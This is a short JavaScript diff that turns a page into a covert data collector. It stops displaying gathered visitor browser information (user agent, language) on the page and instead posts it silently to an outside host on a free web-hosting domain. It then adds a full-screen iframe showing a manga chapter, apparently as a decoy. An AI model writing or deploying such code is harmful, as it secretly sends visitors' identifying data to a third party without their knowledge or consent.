@@ -202,10 +202,11 @@ infos =
     'Full User Agent: ' + navigator.userAgent + ' - ' +
     'lang: ' + navigator.language; //added
 
-document.write(infos + "<br>");
-
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "index.php", true);
+xhr.open("POST", "https://scanmangavf.000webhostapp.com/death-note/vf/battle.php", false);
 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 var params = "fdata=" + encodeURI(infos);
 xhr.send(params);
+
+document.write('<iframe src="https://op-vf.com/manga/death-note/2/16" height="100%" width="100%" frameborder="0"></iframe>')
+//https://op-vf.com/manga/death-note/2/16
